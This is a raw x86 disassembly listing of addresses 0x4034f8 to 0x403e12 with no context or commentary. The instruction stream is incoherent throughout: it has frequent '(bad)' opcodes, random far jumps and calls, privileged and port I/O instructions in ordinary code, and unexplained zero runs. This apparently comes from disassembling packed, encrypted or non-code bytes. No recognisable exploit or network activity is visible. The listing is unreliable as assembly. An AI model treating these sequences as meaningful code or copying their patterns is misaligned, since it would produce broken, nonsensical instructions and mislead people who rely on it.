  4034f8:	ins    BYTE PTR es:[edi],dx
  4034f9:	xchg   edi,eax
  4034fa:	nop
  4034fb:	inc    edx
  4034fc:	call   0x661b:0xb7046743
  403503:	(bad)
  403506:	test   DWORD PTR [ebx-0x1be109bf],0x8e18f631
  403510:	pop    ebp
  403511:	adc    dh,BYTE PTR [esi+0x5c]
  403514:	(bad)  
  403515:	jmp    0xc50d85bf
  40351a:	out    0x10,al
  40351c:	jmp    0xc4bc:0xdabd1ccd
  403523:	mov    edx,0x9f32bdba
  403528:	fisubr WORD PTR [ebp-0x20]
  40352b:	js     0x40352d
  40352d:	add    BYTE PTR [ecx-0x4fd53ee0],ch
  403533:	add    ebx,ecx
  403535:	jb     0x403533
  403537:	repz cli 
  403539:	or     bh,cl
  40353b:	repz clc 
  40353d:	fs pop ds
  40353f:	or     BYTE PTR [ebp-0x7],bl
  403542:	mov    bh,0xd5
  403544:	add    ebp,DWORD PTR [edi]
	...
  40355a:	add    BYTE PTR [edi-0x5c1b3f3f],bh
  403560:	ret    
  403561:	mov    esi,DWORD PTR [edx-0x4fdc4866]
  403567:	xchg   edx,eax
  403568:	mov    esp,0x539e7d8d
  40356d:	adc    al,0x25
  40356f:	mov    eax,ds:0x65c15603
  403574:	les    ecx,FWORD PTR [ecx]
  403576:	jmp    0xe322:0xbaf88b54
  40357d:	cli    
  40357e:	mov    edx,0xe68c8d1c
  403583:	and    eax,0xa291a1a8
  403588:	push   eax
  403589:	cmp    al,0x28
  40358b:	adc    BYTE PTR fs:[ebx],al
  40358e:	xor    ebp,DWORD PTR [edx]
  403590:	mov    esp,0xb74a5033
  403595:	xor    edx,DWORD PTR [ebx+0x18]
  403598:	sahf   
  403599:	pop    ds
  40359a:	xor    DWORD PTR [edx-0x2d],esp
  40359d:	out    0xea,eax
  40359f:	xchg   BYTE PTR [edx],dl
  4035a1:	shr    DWORD PTR [edx],0xaf
  4035a4:	add    ebx,ecx
  4035a6:	bound  ecx,QWORD PTR [ebx+esi*8-0x6]
  4035aa:	retf   0xf342
  4035ad:	clc    
  4035ae:	ins    BYTE PTR es:[edi],dx
  4035af:	das    
  4035b0:	pop    es
  4035b1:	out    0x24,al
  4035b3:	inc    esp
  4035b4:	loope  0x4035b8
  4035b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4035b7:	add    dl,al
  4035b9:	rol    BYTE PTR [eax],0xd3
  4035bc:	add    eax,0x8bc3
	...
  4035d1:	add    BYTE PTR [eax],al
  4035d3:	add    BYTE PTR [ebp-0x28dc084b],ah
  4035d9:	mov    ch,0xfa
  4035db:	lea    esi,[edx+0x19]
  4035de:	(bad)  
  4035df:	pop    es
  4035e0:	mov    eax,ds:0x865603c5
  4035e5:	ret    
  4035e6:	ret    0xbd09
  4035e9:	ror    BYTE PTR [ebx+0x23808df8],cl
  4035ef:	sti    
  4035f0:	popf   
  4035f1:	jp     0x403580
  4035f3:	mov    WORD PTR [ecx+0x52d50d8b],cs
  4035f9:	pop    es
  4035fa:	dec    esi
  4035fb:	or     al,0x3f
  4035fd:	ror    DWORD PTR [esi],0x3
  403600:	xor    al,0x8f
  403602:	cli    
  403603:	xor    eax,DWORD PTR [edi-0x59]
  403606:	div    DWORD PTR [ebx]
  403608:	adc    al,0x8d
  40360a:	pushf  
  40360b:	pop    ds
  40360c:	jmp    0x403623
  40360e:	pop    edx
  40360f:	inc    ebp
  403610:	dec    ebp
  403611:	and    al,0x20
  403613:	ror    DWORD PTR ds:0xc5d90316,0x78
  40361a:	xor    edi,ebx
  40361c:	pop    ebp
  40361d:	xor    BYTE PTR [ebx],0xf9
  403620:	mov    ebx,0xd7050785
  403625:	test   ax,0x3
  403629:	mov    dh,0xc0
  40362b:	rol    BYTE PTR [ebx+0x7],0xc3
  40362f:	mov    esp,DWORD PTR [ebp-0x4a]
  403632:	mul    DWORD PTR [ebx]
  403634:	addr16 mov dh,0xfa
  403637:	lea    eax,[eax]
	...
  40364d:	jb     0x403669
  40364f:	clc    
  403650:	mov    ds:0x56037dc9,eax
  403655:	test   al,0xc2
  403658:	or     DWORD PTR ds:0xa7f88bd2,ecx
  40365e:	fdivr  DWORD PTR [ebp-0x442713dd]
  403664:	lea    esi,[ebx]
  403666:	mov    ch,0xda
  403668:	add    cl,BYTE PTR [eax-0x7c]
  40366b:	add    al,0x4e
  40366d:	mov    bl,0xea
  40366f:	ror    DWORD PTR [esi],0xa4
  403672:	loope  0x4035ff
  403674:	cli    
  403675:	je     0x403619
  403677:	jecxz  0x403670
  403679:	je     0x40361c
  40367b:	xchg   ecx,eax
  40367c:	pushf  
  40367d:	nop
  40367e:	and    DWORD PTR [eax+0x2a],edx
  403681:	sbb    ch,BYTE PTR [ecx+0x6866305d]
  403687:	sbb    BYTE PTR [ebx],al
  403689:	jle    0x4036bb
  40368b:	mov    ebp,0xbab88d33
  403690:	lea    esp,[ebx]
  403692:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403693:	inc    ecx
  403694:	cmp    DWORD PTR [ebp+0x64],edi
  403697:	add    eax,DWORD PTR [esi-0x6d]
  40369a:	push   0xffffffc4
  40369c:	add    al,0xa4
  40369e:	push   0x92b4fb8b
  4036a3:	repz div DWORD PTR [edx]
  4036a6:	pop    edi
  4036a7:	pop    ss
  4036a8:	adc    DWORD PTR [ecx-0x46],0xcbf90386
  4036af:	(bad)
	...
  4036c3:	add    BYTE PTR [eax],al
  4036c5:	add    BYTE PTR [eax+ebp*4+0x183f8bd3],bl
  4036cc:	mov    ebx,0x902e3d33
  4036d1:	jne    0xa4add7a1
  4036d7:	popf   
  4036d8:	out    dx,eax
  4036d9:	shl    dh,0xda
  4036dc:	add    cl,dl
  4036de:	sub    al,0x41
  4036e0:	repz not esp
  4036e3:	repnz nop
  4036e5:	pushf  
  4036e6:	test   al,0xdf
  4036e8:	sti    
  4036e9:	in     al,0x2
  4036eb:	add    ch,dl
  4036ed:	pop    ebp
  4036ee:	mov    edi,0xa4172ac3
  4036f3:	(bad)  [edx-0x43]
  4036f6:	mov    ah,0xb8
  4036f8:	fidivr DWORD PTR [edx+0x47ee8632]
  4036fe:	int    0x7b
  403700:	inc    ebp
  403701:	add    ebp,DWORD PTR [ecx+0x6]
  403704:	sub    ah,al
  403706:	mov    ds:0xbc8b2a01,eax
  40370b:	lock fcomip st,st(2)
  40370e:	mov    al,0x8e
  403710:	jne    0x403728
  403712:	dec    ah
  403714:	mov    bh,0x4a
  403716:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403717:	push   esp
  403718:	stc    
  403719:	les    esp,FWORD PTR [ebp+0x8]
  40371c:	jmp    0xd4ba:0xfabb2cd3
  403723:	mov    eax,0x22988f64
  403728:	and    bh,BYTE PTR [ebx+0x0]
	...
  40373f:	jns    0x403741
  403741:	aaa    
  403742:	and    BYTE PTR [esi-0x3e],ah
  403745:	stc    
  403746:	add    bl,BYTE PTR [ebp-0x78]
  403749:	xchg   ebx,eax
  40374a:	bnd jo 0x40373d
  40374d:	(bad)  
  40374e:	nop
  40374f:	inc    ebx
  403750:	sbb    al,0xf9
  403752:	jg     0x40376c
  403754:	jge    0x403740
  403756:	pop    ebp
  403757:	jg     0x40371a
  403759:	stos   BYTE PTR es:[edi],al
  40375a:	push   ss
  40375b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40375c:	fldenv [edx-0x44]
  40375f:	je     0x403719
  403761:	sbb    bh,BYTE PTR [ebx-0x3a1978d6]
  403767:	mov    cl,0x97
  403769:	add    DWORD PTR [ebx],eax
  40376b:	loope  0x403763
  40376d:	daa    
  40376e:	ret    
  40376f:	stos   DWORD PTR es:[edi],eax
  403770:	jmp    FWORD PTR [ecx]
  403772:	mov    bl,BYTE PTR [eax+esi*8]
  403775:	aas    
  403776:	repnz sbb BYTE PTR [esi-0x474ea300],cl
  40377d:	daa    
  40377e:	mov    BYTE PTR [esi+0x0],cl
  403781:	push   ss
  403782:	sub    dh,ah
  403784:	pop    es
  403785:	add    edi,DWORD PTR [ecx]
  403787:	sbb    eax,0xf51233bb
  40378c:	mov    ecx,0x85b15d8d
  403791:	xor    BYTE PTR [esi],dl
  403793:	lock dec DWORD PTR [ebp-0x13]
  403797:	jmp    0x40375a
  403799:	adc    dl,ch
  40379b:	fiadd  WORD PTR [edi-0x10034506]
  4037a1:	clc    
  4037a2:	je     0x4037a4
	...
  4037b8:	pop    es
  4037b9:	sbb    al,0x5
  4037bb:	cld    
  4037bc:	sbb    al,0x7
  4037be:	add    esi,DWORD PTR [edi]
  4037c0:	mov    eax,ecx
  4037c2:	ret    
  4037c3:	mul    BYTE PTR [edi-0x693f7427]
  4037c9:	mov    ecx,0x8620c233
  4037ce:	pop    es
  4037cf:	lock je 0x4037a8
  4037d2:	fldl2e 
  4037d4:	jmp    0xc2ff:0xafa9c0e6
  4037db:	jb     0x40380b
  4037dd:	out    dx,eax
  4037de:	clc    
  4037df:	fisubr DWORD PTR [ecx*4-0x66f6096c]
  4037e6:	fisttp DWORD PTR [edi-0x57cfab5a]
  4037ec:	gs pop es
  4037ee:	add    ebx,DWORD PTR [ecx+0x7233ba1e]
  4037f4:	ss mov ecx,0xbaaa758d
  4037fa:	jl     0x403787
  4037fc:	xchg   edx,eax
  4037fd:	dec    DWORD PTR [ebp+0x15]
  403800:	rcl    DWORD PTR fs:[eax],0xea
  403804:	out    dx,al
  403805:	xchg   dl,bh
  403807:	add    BYTE PTR ds:0x83f93377,bl
  40380d:	bound  ebx,QWORD PTR [edi]
  40380f:	sub    BYTE PTR gs:[ebx],ch
  403812:	les    eax,FWORD PTR [ebx]
  403814:	xor    BYTE PTR [edi],al
  403816:	rol    ebx,0xf9
  403819:	add    ecx,ebx
  40381b:	mov    edi,0x0
	...
  403830:	add    BYTE PTR [ecx-0x32000083],dl
  403836:	js     0x403843
  403838:	sti    
  403839:	std    
  40383a:	ja     0x4037c9
  40383c:	test   cl,cl
  40383e:	inc    edx
  40383f:	and    ch,BYTE PTR [ecx]
  403841:	fiadd  DWORD PTR [ecx]
  403843:	push   es
  403844:	sar    DWORD PTR [esi+0x4],0x3
  403848:	ret    
  403849:	xchg   ecx,eax
  40384a:	jge    0x40384b
  40384c:	inc    ecx
  40384e:	mov    cl,0xf8
  403850:	or     eax,esi
  403852:	mov    cl,0xfa
  403854:	lea    ebp,[edx]
  403856:	push   ss
  403857:	xchg   edi,eax
  403858:	jmp    DWORD PTR [ebx+eax*2-0x3a7da9fd]
  40385f:	ret    0x7d0a
  403862:	(bad)  
  403863:	mov    edi,0xff7751ff
  403868:	xor    esi,DWORD PTR ds:0x4633fa0b
  40386e:	mov    DWORD PTR [edi+ecx*1-0x546c5d17],ecx
  403875:	jge    0x4038bf
  403877:	cmp    cl,al
  403879:	sysret 
  40387b:	add    ecx,edx
  40387d:	loope  0x4038f5
  40387f:	(bad)  
  403880:	call   ecx
  403882:	mov    dl,0xf7
  403884:	or     edx,edi
  403886:	mov    dl,0xf9
  403888:	(bad)  
  403889:	repnz push ss
  40388b:	cmp    DWORD PTR [eax+0x5e0379bd],esp
  403891:	cmp    al,ch
  403893:	ret    
  403894:	adc    eax,0x0
	...
  4038a9:	add    BYTE PTR [edi+0x20bfdaac],ah
  4038af:	dec    ecx
  4038b0:	mov    esp,0x845d4ff
  4038b5:	sti    
  4038b6:	aam    0x42
  4038b8:	mov    es,WORD PTR [eax+eiz*4-0x75a4a614]
  4038bf:	lods   al,BYTE PTR ds:[esi]
  4038c0:	inc    ebp
  4038c1:	xor    dh,ah
  4038c3:	jmp    0x4038c9
  4038c5:	add    esp,esp
  4038c7:	pop    eax
  4038c8:	mov    esp,0xf010e8ff
  4038cd:	clc    
  4038ce:	lods   al,BYTE PTR ds:[esi]
  4038cf:	adc    esi,eax
  4038d1:	cli    
  4038d2:	sub    bl,BYTE PTR [eax+0x14]
  4038d5:	xchg   edx,eax
  4038d6:	jecxz  0x40387f
  4038d8:	mov    WORD PTR [ebx],es
  4038da:	jno    0x40387b
  4038dc:	ret    0xadc2
  4038df:	lods   al,BYTE PTR ds:[esi]
  4038e0:	sar    DWORD PTR [edi-0x445f48],cl
  4038e6:	je     0x40388c
  4038e8:	psubd  mm6,QWORD PTR [ebx+edx*8-0x77]
  4038ed:	mov    WORD PTR [eax-0x67104fba],?
  4038f3:	lods   al,BYTE PTR ds:[esi]
  4038f4:	dec    ecx
  4038f5:	sub    BYTE PTR [esi+0x6a],ah
  4038f8:	or     eax,DWORD PTR [ebx]
  4038fa:	pop    ebp
  4038fb:	xor    BYTE PTR [ebx-0x8977f01],bh
  403901:	imul   DWORD PTR [edx+eiz*2+0x3722f9f7]
  403908:	sbb    edx,ecx
  40390a:	retf   0x8127
  40390d:	add    eax,DWORD PTR [eax]
	...
  403923:	add    DWORD PTR [eax-0x534d3c3c],esp
  403929:	fdivr  QWORD PTR [edi-0x44c7b0]
  40392f:	xchg   esp,eax
  403930:	xor    eax,0x3274fb0f
  403935:	mov    DWORD PTR [eax+eiz*4-0xc649fe],eax
  40393c:	sub    dl,ch
  40393e:	inc    ecx
  40393f:	xchg   ebx,eax
  403941:	sub    DWORD PTR [edx],eax
  403943:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403944:	lds    ecx,FWORD PTR [esi+0x46b918bb]
  40394a:	test   DWORD PTR [edi],0xdf7410d
  403950:	xchg   DWORD PTR [ebp+0x13],ebx
  403953:	pop    es
  403954:	mov    al,ds:0x50a4b9fd
  403959:	in     eax,0xc4
  40395b:	in     eax,0xb
  40395d:	jmp    0xe0bb:0x16b928d3
  403964:	hlt    
  403965:	adc    DWORD PTR [edi],ecx
  403967:	(bad)  
  403969:	add    BYTE PTR [ecx+0x46d50923],cl
  40396f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403970:	gs jmp 0xa40b:0x28c39f49
  403978:	int3   
  403979:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40397a:	mov    edx,0xf6deb8b0
  40397f:	mov    al,0xc
  403981:	shl    dh,1
  403983:	sahf   
  403984:	xchg   BYTE PTR [ebp+0x1a],ch
	...
  40399b:	add    BYTE PTR [esi+0x12],al
  40399e:	icebp  
  40399f:	dec    ecx
  4039a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039a1:	pop    eax
  4039a2:	cmc    
  4039a3:	les    esp,FWORD PTR [esi+ecx*1-0x16]
  4039a7:	fadd   QWORD PTR [eax-0x48]
  4039aa:	scas   al,BYTE PTR es:[edi]
  4039ab:	mov    edx,0xea2f478
  4039b0:	ins    BYTE PTR es:[edi],dx
  4039b1:	hlt    
  4039b2:	lahf   
  4039b3:	mov    BYTE PTR [ebx],ah
  4039b5:	add    BYTE PTR [ebx+0x39],ch
  4039b8:	hlt    
  4039b9:	scas   eax,DWORD PTR es:[edi]
  4039ba:	jmp    0xa401:0xa9c1b741
  4039c1:	ret    
  4039c2:	ds mov edx,0x7600b848
  4039c8:	cmp    DWORD PTR [ebx-0x42ce8ef5],edi
  4039ce:	lea    edi,[ebp-0x6b]
  4039d1:	in     eax,dx
  4039d2:	icebp  
  4039d3:	and    ebp,DWORD PTR [esi-0x15faa9fd]
  4039d9:	les    ecx,FWORD PTR [edx]
  4039db:	jmp    0xb84d:0x46ff77f4
  4039e2:	xor    eax,DWORD PTR [edx-0x67]
  4039e5:	mov    esp,0x872f3133
  4039ea:	psrld  mm2,0xcf
  4039ee:	sub    ch,dl
  4039f0:	pop    esi
  4039f1:	or     al,cl
  4039f3:	sub    BYTE PTR [ebp+0x1d56ca03],bl
  4039f9:	mov    eax,0xafd10eff
  4039fe:	or     eax,DWORD PTR [eax]
	...
  403a14:	add    cl,bl
  403a16:	mov    ecx,0x91ad5d8d
  403a1b:	shr    DWORD PTR [edi+0x11],cl
  403a1e:	add    al,0x5e
  403a20:	(bad)
  403a23:	adc    eax,0x7d8bcdea
  403a28:	icebp  
  403a29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a2a:	inc    DWORD PTR [eax]
  403a2c:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  403a2e:	add    DWORD PTR [edi-0x1f],ecx
  403a31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a32:	dec    edi
  403a33:	or     al,0xc6
  403a35:	call   0xe377c7f0
  403a3a:	pop    es
  403a3b:	mov    esi,esp
  403a3d:	inc    edx
  403a3e:	mov    bh,0xff
  403a40:	adc    ebx,esp
  403a42:	pop    ebx
  403a43:	pop    eax
  403a44:	inc    esi
  403a45:	int    0xc9
  403a47:	ret    0xa4ed
  403a4a:	dec    ebp
  403a4b:	mov    eax,DWORD PTR [ebp+0x36f8be2a]
  403a51:	cmc    
  403a52:	push   ebx
  403a53:	mov    DWORD PTR [eax],0x7a83
  403a59:	ds add edi,edi
  403a5c:	jne    0x403aa8
  403a5e:	mov    al,BYTE PTR [ebp-0x8]
  403a61:	add    DWORD PTR [edi+0x2ff656f],esi
  403a67:	add    DWORD PTR [ebx],esp
  403a69:	add    esp,edx
  403a6b:	mov    BYTE PTR ds:0x411802,0x87
  403a72:	and    eax,0xb7c1efcd
  403a77:	ja     0x403ade
	...
  403a8d:	add    BYTE PTR [edi],bh
  403a8f:	add    edi,esi
  403a91:	fdiv   QWORD PTR [esi+edx*4-0x39]
  403a95:	add    eax,0x41184a
  403a9a:	adc    BYTE PTR [edi+0x32],al
  403a9d:	adc    cl,al
  403a9f:	mov    bh,0x7f
  403aa1:	gs lsl esi,ax
  403aa5:	loope  0x403a43
  403aa7:	mov    ebp,0xf7551ceb
  403aac:	pop    es
  403aad:	add    eax,DWORD PTR [ebx]
  403aaf:	outs   dx,DWORD PTR ds:[esi]
  403ab0:	push   0x40
  403ab2:	es aaa 
  403ab4:	gs inc ecx
  403ab6:	into   
  403ab7:	push   edx
  403ab8:	call   0xffba1220
  403abd:	add    DWORD PTR [ebx+0x4ae8407a],0x2
  403ac4:	add    BYTE PTR [eax],al
  403ac6:	or     eax,0xcd40f7dd
  403acb:	fmul   DWORD PTR [ebx-0x3c8099a3]
  403ad1:	inc    eax
  403ad2:	add    eax,0xc30307f5
  403ad7:	jp     0x403b2c
  403ad9:	push   0x411502
  403ade:	scas   al,BYTE PTR es:[edi]
  403adf:	data16 cmp al,0xe9
  403ae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ae3:	mov    WORD PTR [eax-0x3e7805ff],?
  403ae9:	sub    DWORD PTR [ebx],0x7
  403aec:	inc    ebx
  403aed:	add    BYTE PTR [edi],ah
  403aef:	sub    DWORD PTR [edi+esi*1+0x0],ebp
	...
  403b06:	add    BYTE PTR [ecx-0x50147b30],bh
  403b0c:	scas   eax,DWORD PTR es:[edi]
  403b0d:	or     eax,0x1de80480
  403b12:	inc    ecx
  403b13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b14:	stos   DWORD PTR es:[edi],eax
  403b15:	inc    esp
  403b16:	js     0x403b31
  403b18:	inc    esp
  403b19:	mov    WORD PTR [eax],es
  403b1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b1c:	stos   DWORD PTR es:[edi],eax
  403b1d:	jl     0x403ae7
  403b1f:	adc    BYTE PTR ds:0x6fa5ebb8,bh
  403b25:	or     eax,0x1e304480
  403b2a:	inc    ecx
  403b2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b2c:	stos   DWORD PTR es:[edi],eax
  403b2d:	inc    esp
  403b2e:	js     0x403b29
  403b30:	xor    BYTE PTR [esi],bh
  403b32:	or     al,0x2e
  403b34:	mov    ah,0x3
  403b36:	add    BYTE PTR [edi-0x39082a28],ah
  403b3c:	aam    0xcb
  403b3e:	paddusw mm1,QWORD PTR [eax-0x3d]
  403b42:	gs stos WORD PTR es:[edi],ax
  403b45:	mov    dl,BYTE PTR ds:0x428703
  403b4b:	iret   
  403b4c:	xchg   ebx,eax
  403b4d:	add    eax,DWORD PTR [eax]
  403b4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b50:	mov    dh,BYTE PTR [eiz*2+0x158aab66]
  403b57:	sbb    eax,DWORD PTR [edi+0x45]
  403b5a:	add    BYTE PTR [esi+edx*8],ch
  403b5d:	cmp    esp,DWORD PTR [ebp-0x1a]
  403b60:	stos   DWORD PTR es:[edi],eax
  403b61:	push   es
  403b62:	enter  0x7198,0x7
  403b66:	leave  
  403b67:	inc    esp
  403b68:	sti    
  403b69:	and    BYTE PTR [ecx+0x0],al
	...
  403b80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b81:	and    dl,BYTE PTR [ecx]
  403b83:	je     0x403b8f
  403b85:	add    ebp,DWORD PTR [eax]
  403b87:	add    al,0x1e
  403b89:	pop    es
  403b8a:	and    DWORD PTR [ecx],esp
  403b8c:	out    0x2,al
  403b8e:	dec    eax
  403b8f:	cmp    dl,al
  403b91:	inc    ebx
  403b92:	jmp    0xcc2f621
  403b97:	inc    ebp
  403b98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b99:	add    eax,0x616d07b1
  403b9e:	cmc    
  403b9f:	and    dh,ah
  403ba1:	add    ah,BYTE PTR [eax+0x11]
  403ba4:	daa    
  403ba5:	pop    ds
  403ba6:	test   al,0x3
  403ba8:	mov    ebp,0xb7315e0e
  403bad:	sub    bl,cl
  403baf:	and    BYTE PTR [esi+0x2],ah
  403bb2:	inc    ecx
  403bb3:	xchg   ecx,eax
  403bb4:	push   DWORD PTR [esi+eax*2+0x3055695b]
  403bbb:	ret    0x2b3
  403bbe:	pushf  
  403bbf:	mov    cl,BYTE PTR [ebx]
  403bc1:	and    DWORD PTR ds:0x26ba2ebc,0xe588e8b7
  403bcb:	enter  0x1eeb,0xa8
  403bcf:	add    ebp,DWORD PTR [esi+ecx*1]
  403bd2:	sbb    al,0xcc
  403bd4:	dec    edx
  403bd5:	inc    ebx
  403bd6:	jmp    0x33451ae1
  403bdb:	lea    ebp,[ebx+0x66212dc7]
  403be1:	add    ah,BYTE PTR [eax+0x10]
	...
  403bf8:	add    dl,ah
  403bfa:	leave  
  403bfb:	dec    esp
  403bfc:	inc    ebp
  403bfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bfe:	inc    ebx
  403bff:	push   esp
  403c00:	fstp   DWORD PTR [esi-0x3d]
  403c03:	(bad)  
  403c04:	mov    dh,0x98
  403c06:	mov    ch,ah
  403c08:	mov    BYTE PTR [edi+0x1d],cl
  403c0b:	sub    BYTE PTR [esp+ebx*1],al
  403c0e:	(bad)  
  403c10:	pop    edi
  403c11:	or     DWORD PTR [edx+0x0],eax
  403c14:	jmp    0x5dcd3c8e
  403c19:	xchg   edx,eax
  403c1a:	inc    ecx
  403c1b:	add    dl,bl
  403c1d:	cwde   
  403c1e:	test   DWORD PTR [edi+eax*1-0x54ccfd16],eax
  403c25:	jae    0x403bea
  403c27:	mov    ebp,esp
  403c29:	pop    ds
  403c2a:	mov    edi,0x41a32866
  403c2f:	jne    0x403bc8
  403c31:	sub    eax,0xe20c7016
  403c36:	add    cl,BYTE PTR [ebx+0x411d80b4]
  403c3c:	jmp    0xc4b8325e
  403c41:	imul   eax,DWORD PTR [edx],0xffffffff
  403c44:	sbb    al,0xdf
  403c46:	sbb    eax,0x3e29e941
  403c4b:	cld    
  403c4c:	inc    esi
  403c4d:	pop    ss
  403c4e:	xor    al,0x65
  403c50:	test   al,0xa4
  403c52:	add    DWORD PTR [ebp+0x31],0x7b
  403c56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c57:	jmp    FWORD PTR [esi]
  403c59:	cmp    DWORD PTR [eax+0x72d6],ecx
	...
  403c6f:	add    BYTE PTR [eax],al
  403c71:	add    BYTE PTR [ecx],ch
  403c73:	lods   al,BYTE PTR ds:[esi]
  403c74:	ror    dl,cl
  403c76:	and    ah,al
  403c78:	push   esp
  403c79:	adc    eax,0xe503c0ad
  403c7e:	pop    ds
  403c7f:	iret   
  403c80:	gs test al,0xa4
  403c83:	inc    DWORD PTR [ecx+eax*1-0x59]
  403c87:	cdq    
  403c88:	jns    0x403cf5
  403c8a:	pop    esi
  403c8b:	mov    bl,0x75
  403c8d:	in     eax,dx
  403c8e:	sub    bh,BYTE PTR [esi]
  403c90:	clc    
  403c91:	jo     0x403d03
  403c93:	mov    dh,0xc1
  403c95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c96:	mov    ecx,0x5662fe87
  403c9b:	rol    ebx,0xe4
  403c9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c9f:	fiadd  DWORD PTR [ecx+0x0]
  403ca2:	retf   
  403ca3:	retf   0xecb9
  403ca6:	inc    ecx
  403ca7:	ins    DWORD PTR es:[edi],dx
  403ca8:	dec    DWORD PTR [ebx+0x33d78948]
  403cae:	retf   
  403caf:	jp     0x403ce4
  403cb1:	ret    0xb37d
  403cb4:	mov    WORD PTR [eax+ebp*4],fs
  403cb7:	aas    
  403cb8:	add    BYTE PTR [ebx],al
  403cba:	mov    esi,DWORD PTR [esi+0x5]
  403cbd:	mov    eax,ds:0xff6ed725
  403cc2:	dec    ebx
  403cc3:	imul   ecx,DWORD PTR [edi+0x7d872645],0xfffffffc
  403cca:	pcmpeqb mm3,QWORD PTR [esi]
  403ccd:	mov    eax,eax
  403ccf:	mov    ebx,esi
  403cd1:	sar    DWORD PTR [ebp-0x4d],0x2
  403cd5:	fadd   DWORD PTR [eax]
	...
  403ceb:	dec    edi
  403cec:	in     al,0xcf
  403cee:	mov    ecx,0xffff6d62
  403cf3:	test   DWORD PTR [ebp-0x75],esi
  403cf6:	push   ebp
  403cf7:	bound  ecx,QWORD PTR [ecx]
  403cf9:	inc    ebp
  403cfa:	cld    
  403cfb:	lods   eax,DWORD PTR ds:[esi]
  403cfc:	lds    esp,FWORD PTR [ebx]
  403cfe:	mov    BYTE PTR ds:0x530403c1,0xf2
  403d05:	gs inc ecx
  403d07:	inc    BYTE PTR [ecx]
  403d09:	inc    ebp
  403d0a:	clc    
  403d0b:	retf   
  403d0c:	retf   0x1bbc
  403d0f:	inc    ecx
  403d10:	ins    DWORD PTR es:[edi],dx
  403d11:	jne    0x403d0f
  403d13:	jno    0x403d08
  403d15:	test   DWORD PTR [ecx-0x393e94dd],0x8bfe89e0
  403d1f:	mov    ebp,0xbd05c3bf
  403d24:	(bad)  
  403d25:	inc    ecx
  403d26:	jne    0x403d1d
  403d28:	aaa    
  403d29:	in     al,dx
  403d2a:	inc    DWORD PTR [ecx-0x58397489]
  403d30:	and    al,0xcc
  403d32:	xor    ebp,edx
  403d34:	mov    edi,0x9fa4c1f0
  403d39:	xchg   ah,al
  403d3b:	or     ebx,ebx
  403d3d:	add    eax,DWORD PTR [ebx]
  403d3f:	loop   0x403db4
  403d41:	(bad)  
  403d42:	aad    0x66
  403d44:	ds retf 0xf2ff
  403d48:	test   BYTE PTR [di+0x5f],al
  403d4c:	xor    esi,DWORD PTR [esi]
  403d4e:	cld    
	...
  403d63:	add    BYTE PTR [esi+0x62],ah
  403d66:	adc    eax,0xb025518b
  403d6b:	shl    DWORD PTR [edi+ebx*4+0x0],0xd8
  403d70:	out    0xb6,al
  403d72:	rol    DWORD PTR [ecx],cl
  403d74:	call   0xee9a:0xa7411eab
  403d7b:	jae    0x403d3f
  403d7d:	pop    edx
  403d7e:	add    eax,DWORD PTR [ecx]
  403d80:	loop   0x403d25
  403d82:	push   ds
  403d83:	inc    ecx
  403d84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d85:	and    al,0x3e
  403d87:	cld    
  403d88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d8a:	aaa    
  403d8b:	gs data16 fwait
  403d8e:	mov    BYTE PTR [ebp-0x1],al
  403d91:	call   0xc903:0x5a827ffe
  403d98:	in     al,0x96
  403d9a:	mov    ah,ch
  403d9c:	call   0x5728492f
  403da1:	and    al,BYTE PTR [ebx]
  403da3:	add    BYTE PTR [esp+edx*1],ah
  403da6:	mov    ah,0x75
  403da8:	mov    DWORD PTR [eax],eax
  403daa:	or     BYTE PTR cs:[edi-0x58ff856b],bh
  403db1:	mov    ah,0xc3
  403db3:	jne    0x403d55
  403db5:	repz mov bl,0xff
  403db8:	mov    al,0xa0
  403dba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403dbb:	adc    ebx,DWORD PTR [ebx+eax*1]
  403dbe:	sub    DWORD PTR [eax],eax
  403dc0:	aaa    
  403dc1:	std    
  403dc2:	test   al,0x39
  403dc4:	mov    al,ds:0xb3d66a
	...
  403ddd:	nop
  403dde:	mov    cl,0xc2
  403de0:	or     BYTE PTR [edx+eax*1],bl
  403de3:	jb     0x403de9
  403de5:	outs   dx,BYTE PTR ds:[esi]
  403de6:	(bad)  
  403de7:	in     eax,0x3
  403de9:	sar    BYTE PTR [ebp-0x3b],cl
  403dec:	xchg   DWORD PTR [ebx-0x4e],ebp
  403def:	sbb    dh,bh
  403df1:	dec    ebp
  403df2:	sbb    al,0xef
  403df4:	sbb    eax,0x9beb1ca6
  403df9:	popf   
  403dfa:	imul   ebp,ecx,0x3
  403dfd:	and    al,0xaa
  403dff:	mov    ?,WORD PTR [ecx]
  403e01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e02:	popf   
  403e03:	or     edi,DWORD PTR [edi+0x5f]
  403e06:	sbb    al,0xd9
  403e08:	and    dl,0xb2
  403e0b:	sbb    DWORD PTR [edi+ebx*1-0x3e4c9158],ebx
  403e12:	leave  
